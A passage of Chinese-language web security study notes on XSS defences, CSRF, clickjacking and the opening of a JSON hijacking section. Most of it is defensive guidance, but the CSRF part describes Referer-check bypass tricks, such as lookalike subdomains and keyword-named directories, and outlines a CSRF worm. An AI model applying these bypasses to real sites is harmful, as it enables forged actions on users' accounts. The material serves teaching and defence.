3. 在该Cookie到期前，浏览器访问该域下的所有页面，都将发送该Cookie

<font color="red">服务器可能会设置多个Cookie(多个key-value对)，而HttpOnly可以有选择性地加在任意一个Cookie值上</font>

在某些时候，应用可能需要JavaScript访问某几项Cookie，这种Cookie可以不设置HttpOnly标记，而仅把HttpOnly标记给用于认证的Cookie添加HttpOnly的过程简单，效果明显，有如四两拔千斤，但部署时需要注意如果业务非常复杂，则需要在所有Set-Cookie的地方，给关键Cookie都加上HttpOnly，漏掉了一个地方，都可能是使得这个方案失效

使用HttpOnly有助于缓解XSS攻击，但仍然需要其他能够解决XSS漏洞的方案

##### <font color="yellow">0002 输入检查</font>

常见的Web漏洞如XSS、SQL Injection等，都要求攻击者构造一些特殊字符，这些特殊字符可能是正常用户不会用到的，所以输入检查就有存在的必要了

输入检查在很多时候也被用于格式检查

这些格式检查有一点像白名单，也可以让一些基于特殊字符的攻击失效

输入检查的逻辑，必须放在服务器端代码中实现，如果只是在客户端使用JavaScript进行输入检查，是很容易被攻击者绕过的

目前的Web开发的普遍做法，是同时在客户端使用JavaScript中和服务器端代码中实现相同的输入检查，客户端JavaScript的输入检查可以阻挡大部分误操作的用户，从而节约服务器资源

在XSS防御上，输入检查一般是检查用户输入的数据中是否包含一些特殊字符,如果发现存在特殊字符，则将这些字符过滤或编码

e.g.

- `<`
- `>`
- `'`
- `"`

比较智能的输入检查可能匹配XSS的特征，如`<script>`、`javascript`

这种输入检查的方式被称为XSS Filter，互联网上有很多开源的XSS Filter的实现

XSS Filter在用户提交数据时获取变量，并进行XSS检查，但此时用户数据并没有结合渲染页面的HTML代码，因此XSS Filter对语境的理解并不完整

如果是一个全局性的XSS Filter，则无法看到用户数据的输出语境，而只能看到用户提交了一个URL，就很可能会漏报，大多数情况下，URL是一种合法的用户数据

XSS Filter还有一个问题：其对于`<`、`>`的处理可能会改变用户数据的语义

对于XSS Filter来说，发现敏感字符`<`，如果其不够智能，粗暴地过滤或者替换了`<`，则可能会改变用户原本的意思

输入数据还可能会被展示在多个地方，每个地方的语境可能各不相同，如果使用单一的替换操作，则可能出现问题

e.g.：用户昵称会在很多地方展示，每个界面的语境也可能各不相同如果在输入时做了统一的更改，那么输出时可能有如下的问题

```text
我的偶像是\"hackjacking\"
我的偶像是"hackjacking"
```

然而第一个结果显然是用户不希望看到的

##### <font color="yellow">0003 输出检查</font>

安全编码函数
> 编码分为很多种，针对HTML代码的编码方式是HtmlEncode
> 
> HtmlEncode并非专用名词，它只是一种函数的实现，它的作用是将字符转换成HTML Entities，对应的标准是ISO-8859-1
> 
> 为了对抗XSS，在HtmlEncode中要求至少转换以下字符
> 
> 	- & - &amp
> 	- < - &lt
> 	- " - &quot
> 	- ' - &#x27 或 &apos(不推荐)
> 	- / - &#x2F(包含反斜线是因为它可能会闭合一些HTML entity)
> 
> 在PHP中，有`htmlentities()`和`htmlspecialchars()`两个函数可以满足安全要求
> 
> JavaScript的编码方式可以使用JavascriptEncode
> 
> JavascriptEncode于HtmlEncode的编码方式不同，它需要使用`\`对特殊字符进行转义在对抗XSS时，还要求输出的变量必须在引号内部以避免造成安全问题
> 
> 要求使用JavascriptEncode的变量输出一定要在引号内
> 
> 没有习惯的话，只能用更加严格的JavascriptEncode函数来保证安全
> 
> 	除了数字、字母的所以字符，都使用十六进制`\xHH`的方式进行编码
> 
> 在OWASP ESAPI中有一个安全的JavascriptEncode的实现，非常严格[http://www.owasp.org/index.php/Category:OWASP_Enterprise_Security_API](http://www.owasp.org/index.php/Category:OWASP_Enterprise_Security_API)
> 
> 除了HtmlEncode、JavascriptEncode外，还有许多用于各种情况的编码函数，比如XMLEncode(实现与HtmlEncode相似)，JSONEncode(于JavascriptEncode相似)等
> 
> 在Apache Common Lang的StringEscapeUtils里，提供了许多escape的函数
> 
> 可以在适当的情况下选用适当的函数，但编码后的数据长度可能会发生改变，从而影响某些功能在编码时需要注意这个细节，以免产生不必要的bug

只需要一种编码吗
> XSS攻击主要发生在MVC架构中的View层，大部分的XSS漏洞可以在模板系统中解决
> 
> 在python的开发架构Django自带的模板系统Django Templates中，可以使用escape进行HtmlEncode
> 
> 在正确的地方使用正确的编码方式
> 
> 对于浏览器来说，htmlparser会优先于JavaScript Parser执行，所以解析过程是被HtmlEncode的字符先被解码，然后执行JavaScript事件
> 
> 导致XSS攻击发生的原因是由于没有分清楚输出变量的语境，因此并非用了auto-escape就万事大吉了
> 
> XSS的防御需要区分情况对待

##### <font color="yellow">0004 正确地防御XSS</font>

> XSS的本质还是一种HTML注入，用户的数据被当成了HTML代码的一部分执行，从而混淆了原本的语义，产生了新的语义，如果网站使用了MVC架构，那么XSS就发生在View层——在应用拼接变量到HTML页面时产生，所以在用户提交数据处进行输入检查的方案，其实并不是在真正发生攻击的地方做防御，想要根治XSS问题，可以列出所有XSS可能发生的场景，再一一解决
> 
> 可能存在以下场景
> 
> - 在HTML标签中输出
> 	- 所有在标签中输出的变量，如果未作任何处理，都可能导致直接产生XSS
> 	- 防御方法：对变量使用HtmlEncode
> - 在HTML属性中输出
> 	- 与标签中输出的XSS相似
> 	- 防御方法：对变量使用HtmlEncode，在OWASP EASAPI中推荐了一种更严格的HtmlEncode——除了字母、数字外，其他所有的特殊字符都被编码成HTMLEnities
> - 在`<script>`标签中输出
> 	- 首先应该确保输出的变量在引号中
> 	- 攻击者需要先闭合引号才能实施XSS攻击
> 	- 防御方法：使用JavascriptEncode
> - 在事件中输出
> - 与`<script>`输出类似
> - 防御方法：使用JavascriptEncode
> - 在CSS中输出
> 	- 防御方法：尽可能禁止用户可控制的变量在`<style>`标签、HTML标签的style属性以及CSS文件中输出，如果一定有这样的需求，OWASP ESAPI中推荐了`encodeForCSS()`函数
> 	- 原理：类似`ESAPI.encoder().encodeForJavaScript()`函数，除了字母、数字外的所有字符都被编码成十六进制形式(`\uHH`)
> - 在地址中输出
> 	1. 在URL的path(路径)或者search(参数)中输出
> 
> 		URLEncode会将字符转换为`%HH`形式
> 
> 		e.g.：`空格 - %20`、`< - %3c`
> 
> 		防御方法：使用URLEncode即可
> 
> 	2. 整个URL能够被用户完全控制，这是URL的Protocal和Host部分是不能够使用URLEncode的，否则会改变URl的语义
> 
> 		在Protocal与Host中，如果使用严格的URLEncode函数，则会吧`:`、`/`、`/`、` `、`、`、`.`等都编码掉 
> 
> 		除了javascript作为伪协议可以执行代码外，还有vbscript、dataURI等协议可能导致脚本执行
> 
> 		dataURI这个伪协议是Mozilla所支持的，能够将一段代码写在URL里
> 
> 		防御方法：如果变量是整个URL，则应该先检查是否以http开头(如果不是则自动添加)以保证不会出现伪协议类的XSS攻击，再对变量进行URLEncode

##### <font color="yellow">0005 处理富文本</font>

> 有些时候，网站需要允许用户提交一些自定义的HTML代码，称之为富文本，在处理富文本时，还是要回到输入检查的思路上来，输入检查的主要问题是在检查时还不知道变量的输出语境，但用户提交的富文本数据，其语义是完整的HTML代码，在输出时也不会`\n`，拼凑到某个标签的属性中，因此可以特殊情况特殊处理，在防御XSS中，列出了所有在HTML中可能执行脚本的地方，而一个优秀的XSS Filter，也应该能够找出HTML代码中所有可能执行脚本的地方，HTML是一种结构化的语言，比较好分析，通过htmlparser可以解析出HTML代码的标签、标签属性和事件，在过滤富文本时，事件应该被严格禁止，因为富文本的展示需求里不应该包括事件这种动态效果，而一些危险的标签，如`<iframe>`、`<scroipt>`、`<base>`、`<from>`等，也是应该严格禁止的对象，在标签的选择上，<font color="red">应该使用白名单，避免使用黑名单</font>
> 
> e.g.：`<a>`、`<img>`、`<div>`等比较安全的标签
> 
> 在富文本过滤中，处理CSS也是一件麻烦的事情，如果允许用户自定义CSS、style，则也可能导致XSS攻击，因此尽可能禁止用户自定义CSS与style，如果一定要允许用户自定义样式，则只能像过滤富文本一样过滤CSS，有一些比较成熟的开源项目，实现了对富文本的XSS检查，Anti-Samy是OWASP上的一个开源项目，也是目前最好的XSS Filter，最早的时候，它是基于Java的，现在已扩展到.NET等语言，[https://www.owasp.org/index.php/Category:OWASP_AntiSamy_Project](https://www.owasp.org/index.php/Category:OWASP_AntiSamy_Project)，在PHP中，可以使用另外一个广受好评的开源项目：HTMLPurify，[http://htmlpurifier.org/](http://htmlpurifier.org/)

##### <font color="yellow">0006 防御DOM Based XSS</font>

> 在button的onclock事件中，执行了定义的一个函数，将HTML代码写入DOM节点，最后导致XSS的发生，事实上，DOM Based XSS是从JavaScript中输出数据到HTML页面里，而前面提到的方法都是针对从服务器应用直接输出到HTML页面的XSS漏洞，因此并不适用于DOM型XSS
> 
> 防御方法：从JavaScript输出到HTML页面，也相当于一次XSS输出到过程，需要分语境使用不同的编码函数
> 
> 以下几个地方是JavaScript输出到HTML页面的必经之路
> 
> - `document.write()`：页面载入过程中用实时脚本创建页面内容，以及用延时脚本创建本窗口或新窗口的内容，在document被加载完后调用`docuemnt.write`方法时将会自动去触发`document.open()`，在载入页面后，浏览器输出流自动关闭，在此之后，任何一个对当前页面进行操作的`document.write()`方法将打开一个新的输出流，它将清除当前页面内容(包括源文档的任何变量或值)(`document.open()`：打开一个新文档，即打开一个流，并擦除当前文档的内容)
> - `document.writeln()`
> - `xxx.innerHTML = `
> - `xxx.outerHTML = `
> - `innerHTML.replace`：获取或替换html中的内容
> - `document.attachEvent()`
> - `window.attachEvent()`：通过`window.attachEvent()`监听小事件
> - `document.location.replace()`：用一个新文档取代当前文档
> - `document.location.assign()`：加载一个新的文档
> - ......
> 
> 需要重点关注这几个地方的参数是否可以被用户控制
> 
> 除了服务器端直接输出变量到JavaScript外，还有几个地方可能会成为DOM型XSS的输入点，也需要重点关注
> 
> - 页面中所有的inputs框
> - `window.location`(`href`、`hash`等)：用于获得当前页面的地址(URL)，并把浏览器重定向到新的页面
> - `window.name`：当前window的名称
> - `document.referrer`：返回一个url，当前页面就是从这个URI所代表的页面跳转或打开的
> - `document.cookie`
> - `localstorage`：`localstorage`属性允许在浏览器中存储key-value对的数据
> - `XMLHttpRsquest`返回的数据：XMLHttpRsquest是一组API函数集，可被JavaScript、JScript、VBScript以及其它web浏览器内嵌的脚本语言调用，通过HTTP在浏览器和web服务器之间收发XML或其它数据
> - ......
> 
> 安全研究者Stefano Di Paola设立了一个DOM型XSS的cheatsheet[http://code.google.com/p/domxsswiki](http://code.google.com/p/domxsswiki)

##### <font color="yellow">0007 不同角度看XSS的风险</font>

> 一般来说，存储型XSS的风险会高于反射型XSS，因为存储型XSS会保存在服务器上，有可能跨网站存在它不改变url的原有结构，因此有时候还能逃过一些IDS的检测
> 
> 从攻击过程来说，反射型XSS一般要求攻击者诱使用户点击一个包含XSS代码的URL链接，而存储型XSS只需要让用户浏览一个正常的URL链接
> 
> 从风险的角度来看，用户之间有互动的页面，是可能发起XSS Worm攻击的地方，而根据不同页面的PageView高低，也可以分析出哪些页面受XSS攻击后影响会更大

#### <font color="yellow">007 总结</font>

> 理论上，XSS漏洞虽然复杂，但却是可以彻底解决的，在设计XSS解决方案时，应该深入理解XSS攻击的原理，针对不同的场景使用不同的方法，同时有很多开源项目为我们提供了参考
> 
> 过滤输入的数据，包括`'`、`"`、`<`、`>`等特殊字符
> 
> 对输出到页面的数据进行相应的编码转换，包括HTMl实体编码、JavaScript编码等

### <font color="yellow">03 跨站点请求伪造(CSRF)</font>

#### <font color="yellow">001 绕过Referer</font>

##### <font color="yellow">0001 Refere为空条件下</font>

利用`ftp://`、`http://`、`https://`、`file://`、`javascript:`、`data:`这个时候浏览器地址栏是`file://`开头的，如果这个HTML页面向任何http站点提交请求的话，这些请求的Referer都是空的

e.g.
- 利用data协议
- bese64编码
- 解码即可看到代码
- 利用https协议

##### <font color="yellow">0002 判断Referer是某域情况下绕过</font>

比如你找的csrf是xxx.com验证的referer是验证的*.xx.com可以找个二级域名之后`<img "csrf地址">`之后在把文章地址发出去就可以伪造

##### <font color="yellow">0003 判断Referer是否存在某关键词</font>

referer判断存在不存在google.com这个关键词，在网站新建一个google.com目录把CSRF存放在google.com目录,即可绕过

##### <font color="yellow">0004 判断referer是否有某域名</font>

判断了Referer开头是否以126.com以及126子域名不验证根域名为126.com 那么我这里可以构造子域名x.126.com.xxx.com作为蠕虫传播的载体服务器，即可绕过

Referer防御CSRF原理：HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理,当用户点击被构造好的CSRF利用页面，那么在执行用户对应操作时，提交的HTTP请求中就有对应的Referer值，此时服务端判断Referer值是否与服务器的域名信息有关,如果不相关则不执行操作

Referer防御代码编写：在PHP中使用`$_SERVER[‘HTTP_REFERER’]`获取页面提交请求中的Referer值(`<?php if(strpos($_SERVER['HTTP_REFERER'],'xx.com') !== false) { 判断成功 } else { 判断失败 } ?>`)

绕过Referer技巧：如果服务端只判断当前的Referer中是否具有域名，那么直接可以新建文件夹进行绕过

Burpsutie自动生成POC

#### <font color="yellow">002 CSRF简介</font>

CSRF(Cross Site Request Forgery)，跨站点请求伪造，它是一种常见的攻击方式，但很多开发者对它很陌生，CSRF也是Web安全中最容易被忽略的一种攻击方式，甚至很多安全工程师都不理解它的利用条件与危害，因此不给予重视，但CSRF在某些时候却能够产生强大的破坏性

#### <font color="yellow">003 CSRF进阶</font>

##### <font color="yellow">0001 浏览器说Cookie策略</font>

> 攻击者伪造的请求之所以能被搜狐服务器验证通过，是因为用户的浏览器成功发送了Cookie的缘故
> 
> 浏览器所持有的Cookie分为两种
> 
> 1.Session Cookie(又称临时Cookie)：Session Cookie则没有指定Expire时间，所以浏览器关闭后，Session Cookie就失效了
> 2.Third-party Cookie(又称本地Cookie)：Third-party Cookie是服务器在Set-Cookie时指定了Expire时间，只有到了Expire时间后Cookie才会生效，所以这种Cookie会保存在本地
> 
> 如果浏览器从一个域的页面中要加载另一个域的资源，由于安全原因，某些浏览器会组织Third-party Cookie的发送，IE出于安全考虑，默认禁止了浏览器在`<img>`、`<iframe>`、`<script>`、`<link>`等标签中发送第三方Cookie，在Firefox中，默认策略是允许发送第三方Cookie的
> 
> 在当前的主流浏览器中，默认会拦截Third-party Cookie的有：IE6、IE7、IE8、Safari
> 
> 不会拦截的有：Firefox2、Firefox3、Opera、Google Chrome、Android等
> 
> 但若CSRF攻击的目标并不需要使用Cookie，则也不需要顾虑浏览器的Cookie策略了

##### <font color="yellow">0002 P3P头的副作用</font>

> 尽管有些CSRF攻击实施起来不需要认证，不需要发送Cookie，但是不可否认的是，大部分敏感或重要的操作是躲藏在认证之后的，因此浏览器拦截第三方Cookie的发送，在某种程度上来说，降低了CSRF攻击的威力，可是这一情况在P3P头介入后变得复杂起来
> 
> P3P Header(The Platform For Privacy Preferences)是W3C制定的一项关于隐私的标准：隐私偏好平台
> 
> 如果网站返回给浏览器的HTTP头中包含有P3P头，则某种程度上来说，将允许浏览器发送第三方Cookie
> 
> 在网站的业务中，P3P头主要用于类似广告等需要跨域访问的页面，但是，很遗憾的是，P3P头设置后对于Cookie的影响将扩大到整个域中的所有页面，因为Cookie是以域和path为单位的，这并不符合最小权限原则
> 
> P3P的策略看起来似乎很难懂，但其实语法很简单，都是一一对应的关系，可以查询W3C标准
> 
> e.g.
> 
> `CP - Compact Policy`
> 
> `CURa - <current/>`
> 
> `a - always`
> 
> [http://www.w3.org/TR/P3P/](http://www.w3.org/TR/P3P/)
> 
> P3P头也可以直接引用一个XML策略文件
> 
> 正因为P3P头目前在网站的应用中被广泛应用，因此在CSRF的防御中不能依赖于浏览器对第三方Cookie的拦截策略，不能心存侥幸

##### <font color="yellow">0003 GET/POST</font>

> 在CSRF攻击流行之初，许多人认为CSRF攻击只能有GET请求发起，因此很多开发者都认为只要把重要的操作改成只允许POST请求，就能防止CSRF
> 
> 形成错误观点的原因主要在于大多数CSRF攻击发起时，使用的HTML标签都是`<img>`、`<iframe>`、`<script>`等带src属性的标签，这类标签只能发起一次GET请求，但不能发起POST请求
> 
> 在禁止GET请求时的攻击方法
> 
> 1.在页面中构造好一个from表单，然后使用JavaScript自动提交这个表单
> 
> 2.将这个页面隐藏在一个看不见的iframe窗口中，那么整个自动提交表单的过程对于用户来说也是看不见的
> 
> 3.安全研究者pdp展示了一个Gmail CSRF漏洞攻击过程，用户登录Gmail账户，一边浏览器获得Gmail的临时Cookie，诱使用户访问一个恶意页面，在这个恶意页面中，隐藏了一个iframe，该iframe的地址指向pdp写的CSRF构造页面，这个链接实际就是把参数生成一个POST的表单，并自动提交，由于浏览器中已经存在Gmail的临时Cookie，所有用户在iframe中对Gmail发起的这次请求会成功，此时，邮箱的Filter中会新创建一条规则，将所有带附件的邮件都转发到攻击者的邮箱中

##### <font color="yellow">0004 Flash CSRF</font>

> Flash中也有很多种方式能够发起网络请求，包括POST，除了URLRequest外，在Flash中还可以使用getURL，loadVars等方式发起请求，在IE6、IE7中，Flash发送的网络请求均可以带上本地Cookie，但IE8起，Flash发起的网络请求已经不再发送本地Cookie了

##### <font color="yellow">0005 CSRF Worm</font>

> 国内的安全组织80sec公布了一个百度的CSRF Worm，漏洞出现在百度用户中心的发送短消息功能中，只需要修改参数sn，即可对指定用户发送短消息，然而百度的另一个接口则能查询出某个用户的所有好友，将两者结合起来，可以组成一个CSRF Worm，让一个百度用户查看一个恶意页面后，将给他的所有好友发送一条短消息，这条短消息中包含一张图片，其地址在次指向CSRF页面，使得这些好友再次将消息发送给他的好友
> 
> - 模拟服务器端取得request的参数：定义蠕虫页面服务器地址，取得？、&符号后的字符串，从URL中提取感染蠕虫的用户名和感染者好友的用户名
> - 好友json数据的动态获取：通过CSRF漏洞从远程加载受害者的好友json数据，根据该接口的json数据格式，提取好友数据为蠕虫的传播流程做准备
> - 感染信息输出和消息发送的核心部分：将感染者的用户名和需要传播的好友用户名放到入错那个链接内，输出短信息
> 
> 这个蠕虫很好地展示了CSRF的破坏性，即使没有XSS漏洞，仅仅依靠CSRF，也是能够发起

#### <font color="yellow">004 CSRF防御</font>

##### <font color="yellow">0001 验证码</font>

> CSRF攻击的过程往往是在用户不知情的情况下构造了网络请求，然而验证码则强制用户必须与应用进行交互，才能完成最终请求，验证码只能作为防御CSRF攻击的一种辅助手段，而不能作为最主要的解决方案

##### <font color="yellow">0002 Referer Check</font>

> Referer Check在互联网中最常见的应用就是防止图片盗链，同理，Referer Check也可以被用于检查请求是否来自合法的源，常见的互联网应用，页面与页面之间都具有一定的逻辑关系，这就使得每个正常请求的Referer具有一定的规律，即使我们能够通过检查Referer是否合法来检查用户是否被CSRF攻击，也仅仅是满足了防御的充分条件，<font color="red">Referer Check的缺陷在于服务器并非什么时候都能取到Referer</font>，在Flash的一些版本中，曾经可以发送自定义的Referer头，虽然Flash在新版本中已经加强了安全限制，不再允许发送自定义的Referer头，但是难免不会有别的客户端插件允许这种操作，出于以上种种原因，我们还是无法依赖于Referer Check作为防御CSRF的主要手段，但是通过Referer Check来监控CSRF的发生却是一种可行的方案

##### <font color="yellow">0003 Anti CSRF Token</font>

> CSRF攻击成功的原因：<font color="red">重要操作的所有参数都是可以被攻击者猜测到的</font>
> 
> 攻击者只有预测出URL的所有参数与参数值，才能成功地构造一个伪造的请求，反之，攻击者将无法完成攻击，出于以上原因，可以想到一个解决方案：把参数加密，或者使用一些随机数，从而让攻击者无法猜测到参数值(不可预测性原则)，在攻击者不知道salt的情况下，是无法构造出这个URL的，因此也就无法发起CSRF攻击了，对于服务器来说，可以从Session或Cookie中取得`username = name`的值，再结合salt对整个请求进行验证，正常请求会被认为是合法的，但这个方法也有其对应的问题
> 
> - 加密后的URL对用户不友好
> - 加随机数后的URL用户不能收藏
> - 普通参数加密后，数据分析会非常困难
> 
> 因此我们需要一个更加通用的解决方案——Anti CSRF Token
> 
> 要Token足够随机，必须使用足够安全的随机数生成算法，或者采用真随机数生成器(物理随机)，Token因该作为一个秘密，为用户与服务器所共同持有，不能被第三方知晓，在实际应用时，Token可以放在用户的Session中，或者浏览器的Cookie中，Token需要同时放在表单与Session，在提交请求时，只需验证两个Token是否一致，如果不一致(包括空Token)，则有可能发生CSRF攻击

##### <font color="yellow">Token的使用原则</font>

> 防御CSRF攻击的Token是根据不可预测性原则设计的方案，所以Token的生成一定要足够随机，需要使用安全的随机数生成器生成Token，如果Token保存在Cookie中，那么如果用户同时打开多个页面同时操作时，当某个页面消耗点Token时，其他页面的Token还是原先被消耗的Token，就会产生差错
> 
> 解决方法：同时生成多个Token，一对一，更放心
> 
> 如果Token出现在某个页面的URL中，则可能会通过Referer的方式泄露，如果页面包含了一张攻击者能指定地址的图片，则该请求地址会作为HTTP请求的Referer发送到evil.com的服务器上，从而导致Token泄露，因此在使用Token时，因该尽量把Token放在表单中把敏感操作由GET改为POST以from表单(或者AJAX)到形式提交，可以避免Token泄露，还有一些其他途径可能导致Token泄露，如XSS及跨域漏洞，都可以让攻击者盗取Token的值，CSRF的Token只适用于防范CSRF攻击，当网站中还有XSS漏洞时，这个方案就会变的无效，因为XSS乐意模拟客户端浏览器执行任意操作，在XSS攻击下，攻击者完全可以请求页面后，读出页面里的Token值，然后构造一个合法的请求，此过程称之为XSRF，用以与CSRF进行区分，XSS带来的问题，因该使用XSS的防御方案给予解决，否则CSRF的Token防御就是空中楼阁，安全防御的体系是相辅相成、缺一不可的

#### <font color="yellow">005 总结</font>

> CSRF攻击是攻击者利用用户的身份操作用户账户的一种攻击方式，设计CSRF的防御方案必须先理解CSRF攻击的原理和本质，根据不可预测性原则，我们通常使用Anti CSRF Token来防御CSRF攻击，在使用Token时，要注意Token的保密性和随机性

### <font color="yellow">04 点击劫持(ClickJacking)</font>

#### <font color="yellow">001 UI-覆盖攻击</font>

通过覆盖不可见的框架误导受害者点击，虽然受害者点击的是他所看到的网页，但其实他所点击的是被黑客精心构建的另一个置于原网页上面的透明页面，这种攻击利用了HTML中`<iframe>`标签的透明属性

修复方法

- X-FRAME-OPTIONS(修改中间件配置)：X-FRAME-OPTIONS是微软提出的一个http头，专门用来防御利用iframe嵌套的点击劫持攻击，并且在IE8、Firefox3.6、Chrome4以上的版本均能很好的支持

	头的值

	- DENY：拒绝任何域加载  
	- SAMEORIGIN：允许同源域下加载  
	- ALLOW-FROM：可以定义允许frame加载的页面地址 

	下载SAPI(The OWASP Enterprise Security API)包解决的简单方法
	- esapi-2.1.0.1.jar，下载地址

		[https://www.owasp.org](https://www.owasp.org)

		[https://download.csdn.net/download/chengcm/11072723](https://download.csdn.net/download/chengcm/11072723)

	- 将esapi-2.1.0.1.jar放到web应用的lib目录下
	- 在web.xml中增加ClickjackFilter过滤器的设置
	- 重启服务器
- 增加js的防御(代码层面的防御)

#### <font color="yellow">002 什么是点击劫持</font>

> 安全专家Robert Hansen与Jeremiah Grossman发现了一种被他们称为ClickJacking(点击劫持)的攻击，这种攻击几乎影响了所有的桌面平台，包括IE、Safari、Firefox、Opera以及Adobe Flash，点击劫持是一种视觉上的欺骗手段，攻击者使用一个透明的、不可见的iframe，覆盖在一个网页上，然后诱使用户在该网站上进行操作，此时用户将在不知情的情况下点击透明的iframe页面，通过调整iframe页面的位置，可以诱使用户恰好点击阿兹iframe页面的一些功能性按钮上，通过控制iframe的长、宽，以及调整top、left的位置，可以把iframe页面内的任意部分覆盖到任何地方，同时设置iframe的position为absolute，并将z-index的值设置为最大，以达到让iframe处于页面的最高层，再通过设置opacity来控制iframe页面的透明度，值为0是完全不可见，点击劫持攻击与CSRF攻击有异曲同工之妙，都是在用户不知情的情况下诱使用户完成一些动作，但是在CSRF攻击过程中，如果出现用户交互的页面，则攻击可能会无法顺利完成，但是点击劫持没有这个顾虑，它利用的就是与用户产生交互的页面

#### <font color="yellow">003 Flash点击劫持</font>

> 攻击者通过通过Flash构造出了点击劫持，在完成一系列复杂操作下，最终控制用户电脑的摄像头
> 
> - 攻击者制造一个Flash游戏，并诱使用户来玩此游戏
> - 该游戏就是诱使用户点击click按钮，每一次点击，这个按钮的位置都会变化
> - 在一步步操作后，打开了用户的摄像头
> 
> 其实该网页隐藏了一个iframe页面，一步步诱使用户点击功能键，从而打开摄像头

#### <font color="yellow">004 图片覆盖攻击</font>

> 点击劫持是一种视觉欺骗，顺着这个思路，还有一些攻击方式也可以起到类似的作用，如图片覆盖，安全研究者sven.vetsch最先提出了这种Cross Site Image Overlaying攻击，简称XSIO，sven.vetsch通过调整图片的style使得图片能够覆盖在他所指定的任意位置XSIO不同于XSS，它利用的是图片的style，或者能够控制CSS如果应用没有下肢style的position为absolute的话，图片就可以覆盖到页面上的任意位置，形成点击劫持，百度空间也曾出现过此问题，[http://hi.baidu.com/aullik5/blog/item/e031985175a02c685352416.html](http://hi.baidu.com/aullik5/blog/item/e031985175a02c685352416.html)，图片还可以伪装得像一个正常的链接、按钮，或者在图片中构造一些文字覆盖在关键的位置，这样就不需要用户点击，也可以达到欺骗的作用，由于`<img>`标签在很多系统中是对用户开放的，因此在现实中有非常多的站点存在被XSIO攻击的可能，在防御XSIO时，需要检查用户提交的HTML代码中，`<img>`标签的style属性是否可能导致浮出

#### <font color="yellow">005 拖拽劫持、数据盗取</font>

> 安全研究者Paul Stone在BlackHat 2010大会上发表了题为Next Generation Clickjacking的演讲，在该演讲中提出了浏览器拖拽事件导致的安全问题，目前很多浏览器都支持使用Drag & Drop的API，对于用户来说，拖拽使他们的操作更加简单，浏览器中的拖拽对象可以是链接、文字、窗口，因此拖拽不受同源策略的限制，拖拽劫持的思路是诱使用户从隐藏的iframe中拖拽出攻击者希望得到的数据，然后放到攻击者能控制的另一个页面中，从而盗取数据，在JavaScript或Java API的支持下，这个攻击过程会变得非常隐蔽，因为它突破了传统ClickJacking一些先天的局限，所以这种新型的拖拽劫持能够造成更大的破坏，国内安全研究者xisigr曾经构造了一个针对Gmail的POC，[http://hi.baidu.com/blog/item/2c2b7a110ec848f0c2ce79ec.html](http://hi.baidu.com/blog/item/2c2b7a110ec848f0c2ce79ec.html)

#### <font color="yellow">006 触屏劫持</font>

> 手机上的触屏劫持攻击被斯坦福的安全研究者公布，这意味着ClickJacking的攻击方式跟进一步，斯坦福安全研究者的将其称为TapJacking，[http://seclab.stanford.edu/websec/framebusting/tapjacking.pdf](http://seclab.stanford.edu/websec/framebusting/tapjacking.pdf)，从手机OS的角度看，触屏实际上是一个事件，OS捕捉这些事件，并执行相应的操作，一次触屏可能对应一下操作
> 
> - touchstart，手指触摸屏幕时产生
> - touchend，手指离开屏幕时产生
> - touchmove，手指滑动时发生
> - touchcancel，系统可取消touch
> 
> 通过将一个不可见的iframe覆盖到当前网页上，可以劫持用户的触屏操作，2010年12月，研发者发现TapJacking可以更改系统安全设置，[http://blog.mylookout.com/look-10-007-tapjacking/](http://blog.mylookout.com/look-10-007-tapjacking/)，[http://vimeo.com/17648348](http://vimeo.com/17648348)

#### <font color="yellow">007 防御ClickJacking</font>

##### <font color="yellow">0001 frame busting</font>

> 可以写一段JavaScript代码，禁止iframe的嵌套，这种方法叫frame busting，但frame busting存在一些缺陷，由于它是JavaScript写的，控制能力不是特别强，因此有许多方法饶过它，此外，像HTML5中iframe的sandbox属性、IE中iframe的security属性等，都可以限制iframe页面中的JavaScript脚本执行，从而可以使得frame busting失效，斯坦福的Gustav Rydstedt等人总结了一片关于攻击frame busting的paper，[http://seclab.stanford.edu/websec/framebusting/framebust.pdf](http://seclab.stanford.edu/websec/framebusting/framebust.pdf)

##### <font color="yellow">0002 X-Frame-Options</font>

> 因为frame busting容易被绕过，所以我们需要一个更好的解决方案----HTTP头的X-Frame-Options
> 
> X-Frame-Options可以说是专门为ClickJacking准备的，以下浏览器已开始支持X-Frame-Options
> 
> - IE 8+
> - Opera 10.50+
> - Safari 4+
> - Chrome 4.1.249.1042+
> - Firefox 3.6.9(or earlier with NoScript)
> 
> 它有三个可选的值
> 
> - DECY：拒绝访问任何iframe
> - SAMEORIGN：只能访问同源域名下的iframe
> - ALLOW-FROM Origin：允许frame加载页面地址
> 
> 网页安全政策(CSP(Content Security Policy))，一种白名单制度

#### <font color="yellow">008 总结</font>

XSS与CSRF需要诱使用户与界面产生交互，而ClickJacking在未来仍然有可能被攻击者利用在钓鱼、欺诈、广告作弊等方面，不可不察

### <font color="yellow">05 JSON劫持</font>

JSON，全称是JavaScript Object Notation，即JavaScript对象标记法，JSON是一种轻量级(Light-Meight)、基于文本的(Text-Based)、可读的(Human-Readable)格式，JSON的名称中虽然带有JavaScript，但这是指其语法规则是参考JavaScript对象的，而不是指只能用于JavaScript语言，JSON无论对于人，还是对于机器来说，都是十分便于阅读和书写的，而且相比XML(另一种常见的数据交换格式)，文件更小，因此迅速成为网络上十分流行的交换格式，近年来JavaScript已经成为浏览器上事实上的标准语言，JavaScript的风靡，与JSON的流行也有密切的关系，因为JSON本身就是参考JavaScript对象的规则定义的，其语法与JavaScript定义对象的语法几乎完全相同，JSON格式的创始人声称此格式永远不升级，这就表示这种格式具有长时间的稳定性，10年前写的文件，10年后也能用，没有任何兼容性问题

#### <font color="yellow">001 JSON的语法规则</font>

JSON的语法规则十分简单，可称得上优雅完美，总结起来有

- 数组(Array)用方括号([])表示
- 对象(Object)用大括号({})表示
- 名称/值对(name/value)组合成数组和对象
- 名称(name)置于双引号中，值(value)有字符串、数值、布尔值、null、对象和数组
- 并列的数据之间用逗号(,)分隔

```json
{
	"name": "xdr630",
	"favorite": "programming"
}
```

#### <font color="yellow">002 JSON和XML</font>

JSON常被拿来与XML做比较，因为JSON的诞生本来就多多少少要有取代XNL的意思，相比XML，JSON的优势如下

- 没有结束标签，长度更短，读写更快
- 能够直接被JavaScript解释器解析
- 可以使用数组

两者比较

1. JSON
```json
{
	"name":"兮动人",
	"age":22,
	"fruits":["apple","pear","grape"]
}
```
2. XML
```xml
	<root>
		<name>兮动人</name>
		<age>22</age>
		<fruits>apple</fruits>
		<fruits>pear</fruits>
